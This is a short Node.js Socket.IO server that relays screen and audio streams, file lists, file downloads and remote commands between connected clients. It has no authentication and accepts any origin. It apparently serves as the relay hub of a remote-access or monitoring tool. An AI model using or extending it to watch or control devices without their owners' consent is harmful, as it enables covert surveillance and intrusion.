const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// 1. CONFIGURATION
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

// 2. WEB HOSTING: Serve files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 3. SOCKET.IO SETUP
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 2e7 // 20MB for high-res screen stream
});

// 4. DATA RELAY LOGIC
io.on('connection', (socket) => {
    console.log(`Connection established: ${socket.id}`);

    socket.on('data-stream', (data) => socket.broadcast.emit('data-stream', data));
    socket.on('audio-stream', (data) => socket.broadcast.emit('audio-stream', data));
    socket.on('file-list', (data) => socket.broadcast.emit('file-list', data));
    socket.on('file-download', (data) => socket.broadcast.emit('file-download', data));
    
    socket.on('command', (cmd) => {
        console.log(`Command received: ${cmd}`);
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => console.log(`User left: ${socket.id}`));
});

// 5. START SERVER & KEEP-ALIVE
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server live on port ${PORT}`);
    
    if (RENDER_EXTERNAL_URL) {
        setInterval(() => {
            https.get(RENDER_EXTERNAL_URL, (res) => {
                console.log(`Keep-Alive Ping: ${res.statusCode}`);
            }).on('error', (e) => console.log("Ping error"));
        }, 600000); // 10 minutes
    }
});
